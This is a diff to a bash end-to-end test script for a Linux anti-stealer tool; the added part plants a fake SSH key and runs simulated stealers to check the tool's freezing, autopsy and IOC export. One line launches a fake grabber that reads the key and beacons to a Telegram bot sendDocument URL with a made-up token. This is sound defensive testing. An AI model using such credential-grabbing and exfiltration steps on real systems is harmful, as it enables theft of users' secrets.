@@ -1,8 +1,9 @@
 #!/usr/bin/env bash
 # End-to-end test of ABA on Linux, in the spirit of scripts/e2e.ps1: install,
 # fake stealers, freeze, kill, a legitimate reader let through, resume, trust,
-# release, a sweep, a hard-link trick, bait repair, uninstall, and a check
-# that nothing is left behind.
+# release, a sweep, a hard-link trick, bait repair, the autopsy of a stealer
+# that read a real key before the bait and of one that didn't, uninstall,
+# and a check that nothing is left behind.
 #
 #   scripts/e2e-linux.sh <aba binary> <grabber binary> <notifyd binary>
 #
@@ -140,6 +141,13 @@ if [ -n "$FFBIN" ]; then
   ls -d "$HOME"/.mozilla/firefox/* "$HOME"/.config/mozilla/firefox/* "$HOME"/snap/firefox/common/.mozilla/firefox/* 2>/dev/null | sed "s/^/      /"
 fi
 note "a used Firefox profile to plant inside: ${FIREFOX:-no} (${FFBIN:-no firefox} -> $(readlink -f "${FFBIN:-/nonexistent}" 2>/dev/null))"
+
+# A real-looking secret for the flight recorder to watch: a private key of
+# this user's, there since before the install (fake, made for this test).
+REALKEY="$HOME/.ssh/id_e2e_real"
+mkdir -p "$HOME/.ssh"; chmod 700 "$HOME/.ssh"
+[ -e "$REALKEY" ] && fail "$REALKEY exists already"
+printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nnot a real key: ABA end-to-end test\n-----END OPENSSH PRIVATE KEY-----\n' > "$REALKEY"; chmod 600 "$REALKEY"
 
 # =====================================================================
 say "Install"
@@ -489,6 +497,57 @@ ok "the restored bait is watched"
 sudo aba kill "$id" >/dev/null || fail "aba kill"
 
 # =====================================================================
+say "The autopsy: a stealer that read a real key before the bait"
+# The answer has to be "it read your real SSH keys", with the evidence saved,
+# the bot token in its memory found, and a shareable file with nothing of yours.
+TOKEN="7134567890:AAHk3n2Lq9xZr8Yv6Tt5Ww4Uu3Ss2Rr1Qq0"
+ELECTRUM=$(bait_file electrum)
+for n in a b; do
+  install -m 755 "$GRABBER" "$HOME/Downloads/stealer-$n"; echo "stealer $n" >> "$HOME/Downloads/stealer-$n"
+done
+# autopsied ID: the alert once its autopsy has finished (within 30 s).
+autopsied() { wait_alert ".id == \"$1\" and ((.autopsy.finished // \"0001\") | startswith(\"0001\") | not)"; }
+pid=$(launch stealer-a "$HOME/Downloads/stealer-a" -beacon "https://api.telegram.org/bot$TOKEN/sendDocument" -out "$OUT/a1" "$REALKEY" "$ELECTRUM") || fail "couldn't start the fake stealer"
+a=$(wait_alert ".process.pid == $pid") || fail "no alert for the stealer that read a real key first"
+id=$(field "$a" .id)
+[ "$(field "$a" .tier)" = critical ] && frozen "$pid" || fail "it wasn't caught as a stealer and frozen: $(field "$a" '.verdict.reasons[0]')"
+has_line "^READ $REALKEY" "$OUT/a1" || fail "the fake stealer didn't read the real-looking key: $(cat "$OUT/a1")"
+has_line "^READ $ELECTRUM" "$OUT/a1" && fail "it read the bait before it was frozen"
+a=$(autopsied "$id") || fail "no finished autopsy for $id within 30 s: $(alerts | jq -c ".[] | select(.id==\"$id\") | .autopsy")"
+[ "$(field "$a" .autopsy.answer)" = read ] || fail "the autopsy says $(field "$a" .autopsy.answer): $(field "$a" .autopsy.headline) $(field "$a" '.autopsy.unsure | tostring')"
+field "$a" '[.autopsy.reads[]?.path] | join(" ")' | grep -q id_e2e_real || fail "the real key isn't among what it read: $(field "$a" '.autopsy.reads | tostring')"
+ok "$(field "$a" .autopsy.headline)"
+note "$(field "$a" '.autopsy.summary[0]')"
+field "$a" '[.autopsy.addresses[]? | select(.kind=="telegram-bot") | .value] | join(" ")' | grep -q "$TOKEN" \
+  || fail "the bot token in its memory wasn't found: $(field "$a" '{scanned: .autopsy.memoryScanned, notes: .autopsy.notes} | tostring')"
+ok "the Telegram bot token in its memory was found ($(field "$a" .autopsy.memoryScanned) bytes looked through)"
+EV="$DATA/evidence/$id"
+sudo test -f "$EV/README.txt" && sudo test -f "$EV/autopsy.json" || fail "no evidence folder: $(sudo ls -la "$EV" 2>&1)"
+sudo sh -c "ls '$EV/program/'*.sample" >/dev/null 2>&1 || fail "no copy of the program in the evidence"
+check "the evidence is root's alone" test "$(sudo stat -c '%U %a' "$EV")" = "root 700"
+sudo aba autopsy "$id" > "$OUT/autopsy.txt" 2>&1 || { cat "$OUT/autopsy.txt"; fail "aba autopsy"; }
+sed 's/^/      /' "$OUT/autopsy.txt" | head -40
+grep -q "SSH keys" "$OUT/autopsy.txt" || fail "aba autopsy doesn't name the SSH keys"
+sudo aba export-ioc "$id" -o "$OUT/ioc.json" || fail "aba export-ioc"
+jq -e --arg t "$TOKEN" '(.file.sha256 | length) == 64 and ([.sendingTo[]?.value] | index($t)) != null' "$OUT/ioc.json" >/dev/null || fail "export-ioc: $(cat "$OUT/ioc.json")"
+grep -q "$HOME" "$OUT/ioc.json" && fail "the shareable file names the home folder: $(cat "$OUT/ioc.json")"
+grep -q "BEGIN OPENSSH" "$OUT/ioc.json" && fail "the shareable file holds the key"
+ok "export-ioc: the program's fingerprint and the bot token, nothing of yours"
+sudo aba kill "$id" >/dev/null || fail "aba kill"
+check "the evidence is still there after aba kill" sudo test -f "$EV/autopsy.json"
+
+say "The autopsy: a stealer that only touched the bait"
+pid=$(launch stealer-b "$HOME/Downloads/stealer-b" -out "$OUT/b1" "$ELECTRUM") || fail "couldn't start the fake stealer"
+id=$(expect_frozen "$pid" "$OUT/b1" "a stealer that read only the bait") || exit 1
+a=$(autopsied "$id") || fail "no finished autopsy for $id within 30 s"
+[ "$(field "$a" .autopsy.answer)" = no-sign ] || fail "the autopsy says $(field "$a" .autopsy.answer), want no-sign: $(field "$a" .autopsy.headline) $(field "$a" '.autopsy.unsure | tostring')"
+field "$a" .autopsy.headline | grep -q "^No sign it read anything real" || fail "headline: $(field "$a" .autopsy.headline)"
+[ "$(field "$a" '[.autopsy.watched[]? | select(.store=="ssh" and .watched)] | length')" = 1 ] || fail "the SSH keys weren't watched the whole time: $(field "$a" '.autopsy.watched | tostring')"
+ok "$(field "$a" .autopsy.headline)"
+note "$(field "$a" '.autopsy.summary[0]')"
+sudo aba kill "$id" >/dev/null || fail "aba kill"
+
+# =====================================================================
 say "Strict: isolating the machine, with the phone alert still getting out"
 # A phone that isn't on this machine's loopback (which isolation leaves
 # alone): a server in a network namespace of its own, over a veth pair.
@@ -565,5 +624,7 @@ if command -v nft >/dev/null; then sudo nft list table inet file_access_monitor 
 ok "nothing left behind"
 
 sudo rm -f /etc/polkit-1/rules.d/49-aba-e2e.rules
-rm -rf "$OUT" "$HOME/Downloads/free-game" "$HOME/Downloads/other-game" "$HOME/Downloads/net-game" "$HOME/Downloads/desk-game" "$HOME/Downloads"/e2e-l1*
+check "the real-looking key was left as it was" grep -q "not a real key" "$REALKEY"
+rm -f "$REALKEY"
+rm -rf "$OUT" "$HOME/Downloads/stealer-a" "$HOME/Downloads/stealer-b" "$HOME/Downloads/free-game" "$HOME/Downloads/other-game" "$HOME/Downloads/net-game" "$HOME/Downloads/desk-game" "$HOME/Downloads"/e2e-l1*
 printf '\n\033[32mAll end-to-end checks passed.\033[0m\n'
